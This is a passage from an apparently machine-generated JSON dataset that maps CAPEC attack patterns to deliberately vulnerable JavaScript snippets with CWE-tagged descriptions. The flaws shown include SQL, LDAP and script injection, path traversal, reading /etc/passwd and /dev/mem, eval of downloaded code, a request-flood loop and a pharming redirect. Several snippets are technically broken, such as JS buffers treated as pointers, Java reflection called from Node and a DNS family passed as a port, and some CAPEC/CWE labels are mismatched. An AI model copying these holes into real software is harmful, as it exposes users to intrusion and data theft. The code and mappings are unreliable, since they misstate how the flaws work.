        "code_snippet": "function validateAndProcessInput(input) {\n  if (input <= MAX_INT) {\n    input += 1;\n    if (input < 0) {\n      // Perform security-critical action\n      console.log('Access granted');\n    } else {\n      console.log('Access denied');\n    }\n  }\n}\n\nconst MAX_INT = 2147483647;\nvalidateAndProcessInput(MAX_INT);",
        "description": "This code snippet demonstrates the CAPEC of exploiting integer structure to cause unexpected values. The function validateAndProcessInput checks if the input is less than or equal to the maximum integer value (MAX_INT). If true, it increments the input by 1, causing an integer overflow and wrapping around to a negative value. The function then checks if the resulting value is less than 0, and if so, performs a security-critical action. This code embodies CWE-682 (Incorrect Calculation), CWE-839 (Numeric Range Comparison Without Minimum Check), CWE-190 (Integer Overflow or Wraparound), CWE-194 (Unexpected Sign Extension), and CWE-192 (Integer Coercion Error)."
    },
    {
        "capec_id": "129",
        "code_snippet": "let buffer = new Buffer(10);\nlet offset = getUserInput(); // CWE-823: Use of Out-of-range Pointer Offset\nlet ptr = buffer[offset]; // CWE-822: Untrusted Pointer Dereference\nif (ptr !== null) {\n  let data = ptr.readUInt8(0); // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n  console.log(data);\n} else {\n  console.log('Pointer is NULL'); // CWE-476: NULL Pointer Dereference\n}",
        "description": "This code snippet demonstrates a pointer attack in JavaScript. It uses user input to calculate an offset for a pointer, which can result in out-of-range pointer arithmetic. The code then dereferences the pointer, which can lead to reading or writing outside the intended memory buffer. If the pointer is NULL, the code attempts to dereference it, leading to a crash or exit."
    },
    {
        "capec_id": "130",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  let arr = [];\n  while (true) {\n    arr.push(new Array(1000000).fill('x')); // allocating excessive memory\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started');\n});",
        "description": "This code snippet demonstrates a denial-of-service attack by allocating excessive memory resources. The while loop continuously allocates large arrays, eventually leading to memory exhaustion. This is an example of CWE-770: Allocation of Resources Without Limits or Throttling and CWE-400: Uncontrolled Resource Consumption. The server will eventually crash or become unresponsive due to the lack of available memory, illustrating the CAPEC."
    },
    {
        "capec_id": "131",
        "code_snippet": "let connections = [];\n\nfunction createConnection() {\n  let conn = new WebSocket('ws://example.com');\n  connections.push(conn);\n  // Simulate some work\n  setTimeout(() => {\n    // Intentionally not closing the connection\n    // CWE-404: Improper Resource Shutdown or Release\n    // CWE-772: Missing Release of Resource after Effective Lifetime\n  }, 1000);\n}\n\nsetInterval(createConnection, 500);\n\n// CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')\n// CWE-1229: Creation of Emergent Resource\n// CWE-826: Premature Release of Resource During Expected Lifetime\n// The connections array will continue to grow, causing a resource leak\n",
        "description": "This JavaScript code snippet demonstrates a resource leak vulnerability. It creates a new WebSocket connection every 500ms and stores it in an array, but never closes or releases the connection. This will cause the array to grow indefinitely, depleting system resources and making them unavailable for legitimate requests."
    },
    {
        "capec_id": "132",
        "code_snippet": "const fs = require('fs');\n\nfunction readFile(filename) {\n  if (fs.existsSync(filename)) {\n    const stats = fs.statSync(filename);\n    if (stats.isFile()) {\n      fs.readFile(filename, 'utf8', (err, data) => {\n        console.log(data);\n      });\n    }\n  }\n}\n\n// attacker creates a symbolic link\nfs.symlink('/etc/passwd', 'userfile.txt', (err) => {\n  if (err) {\n    console.error(err);\n  } else {\n    // legitimate user calls readFile function\n    readFile('userfile.txt');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerability to symbolic link attacks. The readFile function checks if a file exists and is a regular file before reading its contents. However, an attacker can create a symbolic link with the same name as the file, pointing to a sensitive file like /etc/passwd. When the readFile function is called, it will follow the symbolic link and read the contents of the sensitive file, allowing the attacker to access unauthorized files."
    },
    {
        "capec_id": "133",
        "code_snippet": "const debugMode = process.argv.includes('--debug');\nconst adminMode = process.argv.includes('--admin');\n\nif (debugMode) {\n  console.log('Debug mode enabled.');\n  // Unintentionally expose sensitive information\n  console.log('Database credentials: ', dbCredentials);\n}\n\nif (adminMode) {\n  // Unchecked error condition\n  try {\n    executeAdminCommand();\n  } catch (e) {}\n}\n\n// Incomplete list of disallowed inputs\nconst userInput = process.argv[2];\nif (userInput !== '--help' && userInput !== '--version') {\n  // Invoke a control element at an unnecessarily deep horizontal layer\n  executeUtilityFunction(userInput);\n}\n\n// Incorrect chaining or granularity of debug components\nif (debugMode && adminMode) {\n  debugAdminComponent();\n}",
        "description": "This code snippet demonstrates the CAPEC of attempting to invoke all common switches and options in a target application to discover weaknesses. It includes CWEs such as hidden functionality (CWE-912), incomplete list of disallowed inputs (CWE-184), unchecked error condition (CWE-391), incorrect chaining or granularity of debug components (CWE-1296), and invocation of a control element at an unnecessarily deep horizontal layer (CWE-1054). The code unintentionally exposes sensitive information, ignores error conditions, and invokes functions at incorrect layers, making it vulnerable to attacks."
    },
    {
        "capec_id": "134",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/sendEmail', (req, res) => {\n  const { to, from, subject, body } = req.body;\n  const mailOptions = {\n    from: from,\n    to: to,\n    subject: subject,\n    text: body\n  };\n\n  // Vulnerable code: not sanitizing user input\n  mailOptions.headers = {\n    'Content-Type': 'text/html; charset=UTF-8',\n    'MIME-Version': '1.0',\n    'Content-Transfer-Encoding': '7bit',\n    'X-Priority': req.body.priority\n  };\n\n  // Send email using a mail transfer agent (MTA)\n  const transporter = nodemailer.createTransport({\n    host: 'smtp.example.com',\n    port: 587,\n    secure: false, // or 'STARTTLS'\n    auth: {\n      user: 'username',\n      pass: 'password'\n    }\n  });\n\n  transporter.sendMail(mailOptions, (error, info) => {\n    if (error) {\n      return console.log(error);\n    }\n    console.log('Email sent: ' + info.response);\n    res.send('Email sent successfully');\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable email sending functionality in a Node.js application using Express.js and Nodemailer. The code does not properly sanitize user input, allowing an attacker to inject malicious data into the email headers and content, potentially leading to email injection attacks. The CWEs embodied in this code snippet include CWE-150 (Improper Neutralization of Escape, Meta, or Control Sequences), CWE-116 (Improper Encoding or Escaping of Output), CWE-147 (Improper Neutralization of Input Terminators), CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers), and CWE-77 (Improper Neutralization of Special Elements used in a Command)."
    },
    {
        "capec_id": "135",
        "code_snippet": "const userInput = '%s%s%s';\nconsole.log(sprintf(userInput, 'Hello', 'World', 'This is a vulnerable code'));\n",
        "description": "This JavaScript code snippet demonstrates the CAPEC of including formatting characters in a string input field. The sprintf function is used with a user-controlled format string, which can lead to arbitrary memory read or write operations. The CWEs related to this vulnerability include CWE-134 (Use of Externally-Controlled Format String), CWE-20 (Improper Input Validation), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-914 (Improper Control of Dynamically-Identified Variables), and CWE-1286 (Improper Validation of Syntactic Correctness of Input)."
    },
    {
        "capec_id": "136",
        "code_snippet": "const ldap = require('ldapjs');\nconst client = ldap.createClient({ url: 'ldap://localhost:389' });\n\nconst userInput = '*'; // or any other malicious input\nconst baseDN = 'dc=example,dc=com';\nconst filter = `(uid=${userInput})`;\n\nclient.search(baseDN, { filter: filter }, (err, res) => {\n  res.on('searchEntry', (entry) => {\n    console.log('entry: ' + JSON.stringify(entry.object));\n  });\n  res.on('error', (err) => {\n    console.error('error: ' + err.message);\n  });\n});",
        "description": "This code snippet demonstrates an LDAP injection vulnerability. The 'userInput' variable is not properly sanitized, allowing an attacker to inject malicious LDAP filters. In this example, the '*' character is used to retrieve all users on the system, but an attacker could use more sophisticated filters to extract sensitive information or modify the LDAP directory."
    },
    {
        "capec_id": "137",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const userInput = req.query.userInput;\n  const query = `SELECT * FROM users WHERE name LIKE '%${userInput}%';`;\n  db.query(query, (err, results) => {\n    if (err) {\n      res.status(500).send(err);\n    } else {\n      res.send(results);\n    }\n  });\n});",
        "description": "This code snippet demonstrates the CAPEC by allowing an attacker to inject special characters into the HTTP GET request parameter 'userInput', which is used to construct a SQL query. The CWEs embodied in this code snippet include CWE-88 (Improper Neutralization of Argument Delimiters in a Command), CWE-116 (Improper Encoding or Escaping of Output), CWE-598 (Use of GET Request Method With Sensitive Query Strings), CWE-838 (Inappropriate Encoding for Output Context), and CWE-77 (Improper Neutralization of Special Elements used in a Command)."
    },
    {
        "capec_id": "138",
        "code_snippet": "const userInput = \"java.lang.Runtime\";\nconst methodName = \"getRuntime\";\nconst methodParams = [];\n\ntry {\n  const clazz = java.lang.Class.forName(userInput);\n  const method = clazz.getMethod(methodName, ...methodParams);\n  const result = method.invoke(null, ...methodParams);\n  console.log(result);\n} catch (e) {\n  console.error(e);\n}",
        "description": "This JavaScript code snippet demonstrates the CAPEC of using externally-controlled input to select classes or code ('Unsafe Reflection'). The userInput variable is used to select a class, and the methodName variable is used to select a method to invoke on that class. This can lead to code injection, command injection, or reflection attacks if the input is not properly validated."
    },
    {
        "capec_id": "139",
        "code_snippet": "const fs = require('fs');\nconst userInput = '../secretFiles/confidential.txt';\nconst filePath = './uploads/' + userInput;\nfs.readFile(filePath, (err, data) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log(data);\n  }\n});",
        "description": "This code snippet demonstrates a path traversal vulnerability. The userInput variable is concatenated with a base directory './uploads/' to construct a filePath. An attacker can manipulate the userInput variable to traverse to parent directories using '../' or './' sequences, allowing access to arbitrary files or resources outside of the intended directory."
    },
    {
        "capec_id": "140",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\nlet currentState = 'form1';\n\napp.post('/form1', (req, res) => {\n  currentState = 'form2';\n  res.redirect('/form2');\n});\n\napp.post('/form2', (req, res) => {\n  if (currentState !== 'form2') {\n    res.status(403).send('Access denied');\n  } else {\n    // Process form2 data\n    res.redirect('/form3');\n  }\n});\n\napp.post('/form3', (req, res) => {\n  if (currentState !== 'form3') {\n    res.status(403).send('Access denied');\n  } else {\n    // Process form3 data\n    res.send('Data submitted successfully');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable web application that uses a sequence of forms to collect user data. The application uses a global variable 'currentState' to keep track of the current form state. However, an attacker can bypass the form sequence by directly submitting a request to a later form, potentially leading to incomplete data collection or incorrect assumptions about the submitted data. The code is vulnerable to CWE-372 (Incomplete Internal State Distinction), CWE-472 (External Control of Assumed-Immutable Web Parameter), CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-807 (Reliance on Untrusted Inputs in a Security Decision), and CWE-352 (Cross-Site Request Forgery)."
    },
    {
        "capec_id": "141",
        "code_snippet": "const cache = {\n  set: function(key, value) {\n    localStorage.setItem(key, value);\n  },\n  get: function(key) {\n    return localStorage.getItem(key);\n  }\n};\n\n// Untrusted data source\nconst untrustedData = {\n  'userDetails': {\n    'name': 'John Doe',\n    'email': 'johndoe@example.com'\n  }\n};\n\n// Trusted data source\nconst trustedData = {\n  'userDetails': {\n    'name': 'Jane Doe',\n    'email': 'janedoe@example.com'\n  }\n};\n\n// CWE-348: Using untrusted data source\nconst userData = untrustedData.userDetails;\n\n// CWE-345: Insufficient verification of data authenticity\nif (userData) {\n  cache.set('userDetails', userData);\n}\n\n// CWE-349: Accepting extraneous untrusted data with trusted data\nconst mergedData = { ...trustedData, ...untrustedData };\n\n// CWE-346: Origin validation error\nconst userDetails = cache.get('userDetails');\nif (userDetails) {\n  console.log('User Details:', userDetails);\n}\n\n// CWE-524: Using cache containing sensitive information\nconst sensitiveData = cache.get('creditCardNumber');\nif (sensitiveData) {\n  console.log('Credit Card Number:', sensitiveData);\n}",
        "description": "This code snippet demonstrates the CAPEC of exploiting cache technologies by using untrusted data sources, insufficiently verifying data authenticity, accepting extraneous untrusted data, and failing to properly validate the origin of data. It also uses a cache containing sensitive information, which can be accessed by an unauthorized actor."
    },
    {
        "capec_id": "142",
        "code_snippet": "const dns = require('dns');\n\nasync function resolveDomain(domain) {\n  const ip = await dns.resolve4(domain);\n  const hostname = await dns.reverse(ip);\n  // Use the unverified hostname for a security-critical action\n  if (hostname === 'example.com') {\n    // Perform a sensitive operation\n    console.log('Access granted');\n  } else {\n    console.log('Access denied');\n  }\n}\n\nresolveDomain('example.com');",
        "description": "This code snippet demonstrates a vulnerable DNS resolution implementation in JavaScript. It uses the 'dns' module to resolve a domain name to an IP address and then performs a reverse DNS lookup to obtain the hostname. However, it does not properly verify the authenticity of the obtained hostname, making it vulnerable to DNS cache poisoning attacks. An adversary can modify the DNS cache to return a malicious hostname, which the code will accept as trusted, leading to a potential security breach."
    },
    {
        "capec_id": "143",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.get('/repository', (req, res) => {\n  fs.readdir('./repository', (err, files) => {\n    if (err) {\n      res.status(500).send({ message: 'Error accessing repository' });\n    } else {\n      res.send(files);\n    }\n  });\n});\n\napp.get('/downloadCode', (req, res) => {\n  const file = './sensitiveCode.js';\n  res.download(file);\n});\n\napp.get('/searchIndex', (req, res) => {\n  const searchIndex = './searchIndex.json';\n  fs.readFile(searchIndex, (err, data) => {\n    if (err) {\n      res.status(500).send({ message: 'Error accessing search index' });\n    } else {\n      res.send(JSON.parse(data));\n    }\n  });\n});",
        "description": "This code snippet demonstrates the CAPEC of an adversary searching a targeted web site for web pages that have not been publicized. The code has several vulnerabilities related to CWEs: 425 (Direct Request), 527 (Exposure of Version-Control Repository), 612 (Improper Authorization of Index Containing Sensitive Information), 219 (Storage of File with Sensitive Data Under Web Root), and 494 (Download of Code Without Integrity Check). The code exposes a repository directory, allows downloading of sensitive code without integrity checks, and provides access to a search index containing sensitive information without proper authorization."
    },
    {
        "capec_id": "144",
        "code_snippet": "const axios = require('axios');\n\nasync function discoverHiddenServices() {\n  const url = 'https://example.com';\n  const wsdlUrl = url + '/?wsdl';\n  const versionControlUrl = url + '/.git/';\n\n  try {\n    const wsdlResponse = await axios.get(wsdlUrl);\n    const versionControlResponse = await axios.get(versionControlUrl);\n    const hiddenServices = [];\n\n    // Extract hidden services from WSDL file\n    const wsdlXml = wsdlResponse.data;\n    const parser = new DOMParser();\n    const xmlDoc = parser.parseFromString(wsdlXml, 'text/xml');\n    const serviceElements = xmlDoc.getElementsByTagName('service');\n    for (let i = 0; i < serviceElements.length; i++) {\n      const serviceName = serviceElements[i].getAttribute('name');\n      hiddenServices.push(serviceName);\n    }\n\n    // Extract hidden services from version control repository\n    const versionControlHtml = versionControlResponse.data;\n    const repoParser = new DOMParser();\n    const repoDoc = repoParser.parseFromString(versionControlHtml, 'text/html');\n    const fileElements = repoDoc.getElementsByTagName('tr');\n    for (let i = 0; i < fileElements.length; i++) {\n      const fileElement = fileElements[i];\n      const fileAnchor = fileElement.getElementsByTagName('a')[0];\n      const fileName = fileAnchor.textContent;\n      if (fileName.endsWith('.js')) {\n        hiddenServices.push(fileName);\n      }\n    }\n\n    // Download and execute hidden services without integrity check\n    for (let i = 0; i < hiddenServices.length; i++) {\n      const serviceName = hiddenServices[i];\n      const serviceUrl = url + '/' + serviceName;\n      const script = await axios.get(serviceUrl);\n      eval(script.data);\n    }\n  } catch (error) {\n    console.error(error);\n  }\n}\n\ndiscoverHiddenServices();",
        "description": "This JavaScript code snippet demonstrates the CAPEC of searching a targeted web site for web services that have not been publicized. It uses CWE-651 to extract hidden services from a WSDL file, CWE-527 to extract hidden services from a version control repository, and CWE-494 to download and execute the hidden services without integrity check. The code also omits security-relevant information, as per CWE-223."
    },
    {
        "capec_id": "145",
        "code_snippet": "const crypto = require('crypto');\n\nfunction generateChecksum(message) {\n  // CWE-328: Using a weak hash algorithm (MD5) that can be vulnerable to preimage attacks\n  const hash = crypto.createHash('md5');\n  hash.update(message);\n  return hash.digest('hex');\n}\n\nfunction sendMessage(message) {\n  const checksum = generateChecksum(message);\n  // CWE-354: Not validating the integrity check value\n  // CWE-924: Not ensuring message integrity during transmission\n  return { message, checksum };\n}\n\nfunction receiveMessage(messageWithChecksum) {\n  const { message, checksum } = messageWithChecksum;\n  const receivedChecksum = generateChecksum(message);\n  // CWE-353: Missing support for integrity check\n  // CWE-1283: Mutable attestation or measurement reporting data\n  if (receivedChecksum === checksum) {\n    console.log('Message received successfully');\n  } else {\n    console.log('Message has been tampered with');\n  }\n}\n\n// Example usage:\nconst originalMessage = 'Hello, World!';\nconst messageWithChecksum = sendMessage(originalMessage);\n\n// Adversary modifies the message and checksum\nconst tamperedMessage = 'Hello, Universe!';\nconst tamperedChecksum = generateChecksum(tamperedMessage);\nmessageWithChecksum.message = tamperedMessage;\nmessageWithChecksum.checksum = tamperedChecksum;\n\nreceiveMessage(messageWithChecksum);",
        "description": "This code snippet demonstrates the CAPEC of checksum spoofing, where an adversary modifies a message and its corresponding checksum to make it appear valid. The code uses a weak hash algorithm (MD5) that can be vulnerable to preimage attacks (CWE-328). It also lacks proper validation of the integrity check value (CWE-354) and does not ensure message integrity during transmission (CWE-924). Additionally, it is missing support for integrity checks (CWE-353) and has mutable attestation or measurement reporting data (CWE-1283)."
    },
    {
        "capec_id": "146",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst xmljs = require('xml-js');\n\napp.post('/submit', (req, res) => {\n  const xmlData = req.body.xml;\n  const xsdData = req.body.xsd;\n  const xml = xmljs.js2xml(xmlData, {compact: true, ignoreComment: true, spaces: 4});\n  const xsd = xmljs.js2xml(xsdData, {compact: true, ignoreComment: true, spaces: 4});\n  const validator = require('xsd-validator');\n  validator.validate(xml, xsd, (err, result) => {\n    if (err) {\n      res.status(400).send('Invalid XML');\n    } else {\n      // Process the XML data without proper validation\n      res.send('XML processed successfully');\n    }\n  });\n});",
        "description": "This code snippet demonstrates the CAPEC of schema poisoning by allowing an attacker to control the XML schema (xsdData) and XML data (xmlData) sent in the request body. The code uses the xml-js library to parse the XML and XSD data, and the xsd-validator library to validate the XML against the XSD. However, the validation is not properly implemented, allowing an attacker to manipulate the XSD and XML data to compromise the security of the system. This code is vulnerable to CWE-15 (External Control of System or Configuration Setting), CWE-472 (External Control of Assumed-Immutable Web Parameter), CWE-112 (Missing XML Validation), CWE-91 (XML Injection), and CWE-643 (Improper Neutralization of Data within XPath Expressions)."
    },
    {
        "capec_id": "147",
        "code_snippet": "const soap = require('soap');\nconst xml = '<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope/\"> <soap:Body> <m:GetPrice xmlns:m=\"http://example.com\"> <m:Item>test</m:Item> </m:GetPrice> </soap:Body> </soap:Envelope>';\n\nconst url = 'http://example.com/wsdl';\n\nasync function floodTarget() {\n    while (true) {\n        try {\n            const client = await soap.createClient(url, {});\n            client.GetPrice({ Item: 'test' }, function(err, result) {\n                if (err) {\n                    console.log(err);\n                }\n            });\n        } catch (e) {\n            console.log(e);\n        }\n    }\n}\n\nfloodTarget();",
        "description": "This JavaScript code snippet demonstrates a resource depletion attack by sending a large number of small SOAP messages to a target system, causing a denial of service or crash. The code uses the 'soap' package to create a SOAP client and send repetitive SOAP transactions to the target system without any rate limiting or throttling, leading to uncontrolled resource consumption (CWE-400). The code also lacks XML validation (CWE-112) and transmits sensitive information in cleartext (CWE-319). Additionally, the code does not correctly specify the intended destination for the SOAP request (CWE-941) and allocates resources without limits or throttling (CWE-770)."
    },
    {
        "capec_id": "148",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.get('/', (req, res) => {\n  res.sendFile(__dirname + '/public/index.html');\n});\n\napp.post('/transfer', (req, res) => {\n  const amount = req.body.amount;\n  const recipient = req.body.recipient;\n  // No verification of authenticity or integrity of the request data\n  // CWE-345: Insufficient Verification of Data Authenticity\n  // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n  performTransaction(amount, recipient);\n  res.send('Transaction successful');\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable web application that is susceptible to content spoofing attacks. The application serves static files from the 'public' directory and handles a POST request to transfer funds. However, it does not verify the authenticity or integrity of the request data, making it vulnerable to tampering. An attacker could intercept and modify the request data, leading to unauthorized transactions. The code also stores raw content under the web document root with an extension that is not specifically handled by the server, making it vulnerable to CWE-433: Unparsed Raw Web Content Delivery. Additionally, the application does not implement CSRF protection, making it vulnerable to CWE-352: Cross-Site Request Forgery (CSRF)."
    },
    {
        "capec_id": "149",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction createTempFile(userInput) {\n  const tempDir = '/tmp';\n  const tempFileName = userInput + '.tmp';\n  const tempFilePath = path.join(tempDir, tempFileName);\n  fs.writeFileSync(tempFilePath, 'temporary file content');\n  return tempFilePath;\n}\n\n// Example usage:\nconst userInput = 'attacker-controlled-input';\nconst tempFilePath = createTempFile(userInput);\nconsole.log(tempFilePath);\n",
        "description": "This code snippet demonstrates the creation of a temporary file with a predictable name based on user input. The 'createTempFile' function takes user input, concatenates it with a '.tmp' extension, and writes a file to the '/tmp' directory. This allows an attacker to predict the name and location of the temporary file, potentially leading to further attacks such as information gathering and symlink attacks."
    },
    {
        "capec_id": "150",
        "code_snippet": "const fs = require('fs');\n\n// CWE-552: Files or Directories Accessible to External Parties\nfs.readFile('/etc/config.json', (err, data) => {\n  if (err) {\n    console.error(err);\n    return;\n  }\n  const config = JSON.parse(data);\n  // CWE-1258: Exposure of Sensitive System Information Due to Uncleared Debug Information\n  console.log(config.debugInfo);\n  // CWE-1272: Sensitive Information Uncleared Before Debug/Power State Transition\n  const sensitiveData = config.sensitiveData;\n  // CWE-1323: Improper Management of Sensitive Trace Data\n  const traceData = fs.readFileSync('/var/log/trace.log', 'utf8');\n  console.log(traceData);\n  // CWE-1330: Remanent Data Readable after Memory Erase\n  const erasedMemory = fs.readFileSync('/dev/mem', 'utf8');\n  console.log(erasedMemory);\n});",
        "description": "This code snippet demonstrates the CAPEC of exploiting well-known locations for resources to undermine security. It uses Node.js to read sensitive files and data from default locations, such as /etc/config.json, /var/log/trace.log, and /dev/mem, without proper access control or clearance of sensitive information."
    },
    {
        "capec_id": "151",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\nconst users = {\n  'admin': 'password123',\n  'user': 'password123'\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] === password) {\n    // Authentication bypass by spoofing (CWE-290)\n    // No verification of the claimed identity\n    res.json({ authenticated: true, role: 'admin' });\n  } else {\n    res.status(401).json({ authenticated: false });\n  }\n});\n\napp.get('/protected', (req, res) => {\n  // Improper authentication (CWE-287)\n  // No validation of the authentication credentials\n  if (req.query.authenticated === 'true') {\n    res.json({ message: 'Welcome, admin!' });\n  } else {\n    res.status(403).json({ message: 'Access denied' });\n  }\n});",
        "description": "This code snippet demonstrates identity spoofing by allowing an attacker to bypass authentication and assume the identity of an admin user. The login endpoint does not properly verify the claimed identity, and the protected endpoint relies on an unvalidated query parameter to grant access. This code is vulnerable to CWE-287, CWE-290, and CWE-1390."
    },
    {
        "capec_id": "153",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/user', (req, res) => {\n  const { username, email } = req.body;\n  if (username && email) {\n    // No input validation, assumes username and email are strings\n    const user = { username, email };\n    // Use the untrusted input in a security decision\n    if (username === 'admin') {\n      res.send('Welcome, admin!');\n    } else {\n      res.send('Hello, ' + username);\n    }\n  } else {\n    res.status(400).send('Invalid request');\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC of exploiting weaknesses in input validation. The Express.js server receives input from the client in the form of a POST request to the '/user' endpoint. The input is not validated, and the code assumes that the 'username' and 'email' properties are strings. The code then uses the untrusted input in a security decision, checking if the 'username' is 'admin'. This code is vulnerable to CWE-20: Improper Input Validation, CWE-1286: Improper Validation of Syntactic Correctness of Input, CWE-1287: Improper Validation of Specified Type of Input, CWE-807: Reliance on Untrusted Inputs in a Security Decision, and CWE-1173: Improper Use of Validation Framework."
    },
    {
        "capec_id": "154",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://example.com/api/data', true);\nxhr.withCredentials = true;\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    const response = JSON.parse(xhr.responseText);\n    const iframe = document.createElement('iframe');\n    iframe.src = response.url;\n    document.body.appendChild(iframe);\n  }\n};\nxhr.send();",
        "description": "This JavaScript code snippet demonstrates a vulnerable code that embodies the CAPEC 'An adversary deceives an application or user and convinces them to request a resource from an unintended location.' The code sends a GET request to a server and loads the response URL into an iframe. The CWEs related to this CAPEC are CWE-451 (User Interface Misrepresentation of Critical Information), CWE-941 (Incorrectly Specified Destination in a Communication Channel), CWE-290 (Authentication Bypass by Spoofing), CWE-940 (Improper Verification of Source of a Communication Channel), and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints). The code is vulnerable to spoofing attacks, as it does not properly verify the source of the response URL and loads it into an iframe, allowing an adversary to deceive the application and user."
    },
    {
        "capec_id": "155",
        "code_snippet": "const fs = require('fs');\nconst tempFile = 'temp_' + Math.random().toString(36).substr(2, 9) + '.txt';\nfs.writeFileSync(tempFile, 'username=' + username + '&password=' + password);\n// Perform some operations\nfs.unlinkSync(tempFile);\n\n// Cache containing sensitive information\nconst cache = {};\ncache['user'] = { username: 'admin', password: 'password123' };\n\n// Create a temporary file in a directory with insecure permissions\nconst tempDir = './temp/';\nfs.mkdirSync(tempDir, 0o777);\nconst tempFileInDir = tempDir + 'temp_file.txt';\nfs.writeFileSync(tempFileInDir, 'username=' + username + '&password=' + password);\n\n// Create a temporary file with insecure permissions\nconst tempFileWithInsecurePerm = 'temp_file_with_insecure_perm.txt';\nfs.writeFileSync(tempFileWithInsecurePerm, 'username=' + username + '&password=' + password, '0666');\n\n// Store sensitive data under web root\nconst webRoot = './public/';\nfs.mkdirSync(webRoot, 0o777);\nconst sensitiveDataFile = webRoot + 'sensitive_data.txt';\nfs.writeFileSync(sensitiveDataFile, 'username=' + username + '&password=' + password);",
        "description": "This code snippet demonstrates the CAPEC of exploiting temporary, insecure storage of information. It creates temporary files with sensitive information, stores cache containing sensitive information, creates temporary files in directories with insecure permissions, creates temporary files with insecure permissions, and stores sensitive data under the web root. This code is vulnerable to attacks, as an adversary can access these temporary files and cache to obtain sensitive information."
    },
    {
        "capec_id": "157",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/sensitiveData', (req, res) => {\n  const sensitiveInfo = 'username:password';\n  res.send(sensitiveInfo);\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable web server that transmits sensitive information (username and password) in cleartext over an unencrypted channel, making it susceptible to sniffing attacks (CAPEC-300). The code does not implement encryption for sensitive data (CWE-311), transmits sensitive information in cleartext (CWE-319), and does not ensure message integrity during transmission (CWE-924). An attacker can intercept and read the sensitive information, potentially leading to unauthorized access."
    },
    {
        "capec_id": "158",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  const sensitiveData = { username: 'admin', password: 'password123' };\n  res.json(sensitiveData);\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable server that transmits sensitive information in cleartext, making it susceptible to network sniffing attacks. The server listens on port 3000 and responds to GET requests at '/api/data' with a JSON object containing a username and password. An attacker can capture this traffic to obtain the sensitive data, illustrating CWE-319. The lack of encryption and authentication mechanisms also makes this code vulnerable to CWE-311, CWE-294, CWE-406, and CWE-497."
    },
    {
        "capec_id": "159",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nlet libPath = './library';\nlet libName = 'mylib';\n\ntry {\n    let lib = require(libPath + '/' + libName);\n    lib.doSomething();\n} catch (e) {\n    console.error('Error loading library:', e);\n}\n\n// Vulnerable code: using user input to control the search path\nlet userInput = './malicious_library';\ntry {\n    let maliciousLib = require(userInput + '/' + libName);\n    maliciousLib.doSomething();\n} catch (e) {\n    console.error('Error loading malicious library:', e);\n}",
        "description": "This code snippet demonstrates the CAPEC pattern of exploiting a weakness in the way an application searches for external libraries. The code uses the 'require' function to load a library, but the search path is controlled by user input, making it vulnerable to manipulation. An adversary can supply a malicious library with the same name, allowing them to execute arbitrary code. This code embodies CWEs 706, 426, 73, and 427."
    },
    {
        "capec_id": "160",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/executeScript', (req, res) => {\n  const script = req.query.script;\n  res.set('Content-Type', 'text/html');\n  res.send(`<script>${script}</script>`);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable API that takes a script as an input and executes it on the client-side. The API uses Express.js to create a server that listens on port 3000. When a GET request is made to '/executeScript', the API retrieves the script from the query parameter and sends it back as an HTML response with a script tag. This allows an attacker to inject malicious scripts, which can lead to cross-site scripting (CWE-79) and other vulnerabilities."
    },
    {
        "capec_id": "161",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst dns = require('dns');\n\napp.get('/', (req, res) => {\n  const originalUrl = req.originalUrl;\n  const manipulatedUrl = originalUrl.replace('bank.com', 'pharming-site.com');\n  dns.lookup(manipulatedUrl, (err, address, family) => {\n    if (err) {\n      res.status(500).send('Error occurred');\n    } else {\n      res.redirect(`http://${address}:${family}`);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
